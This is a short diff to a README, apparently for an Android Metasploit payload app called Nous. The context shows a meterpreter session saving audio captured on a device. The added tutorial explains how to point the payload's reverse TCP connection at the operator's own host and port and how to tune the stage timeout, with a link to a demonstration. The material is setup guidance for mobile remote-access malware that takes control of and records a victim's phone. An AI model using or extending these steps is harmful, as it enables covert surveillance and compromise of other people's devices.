@@ -22,4 +22,18 @@ Audio saved to: /root/android/TLbcSexf.wav
 meterpreter >
 ```
 Tuturial:
+
+Open the file: Nous/app/src/main/java/nous/client/Payload.java
+
+On line 26 edit your host and Port.
+```
+public static final String URL = "ZZZZtcp://Host:Port
+```
+
+On line 123 you can adjust the metasploit stage waiting time:
+```
+sock.setSoTimeout(1000);
+```
+
+Demonstration:
 https://drive.google.com/file/d/16A04UXXqvm8R--Tk4vuHnf33qJEuiRsk/view?usp=drivesdk
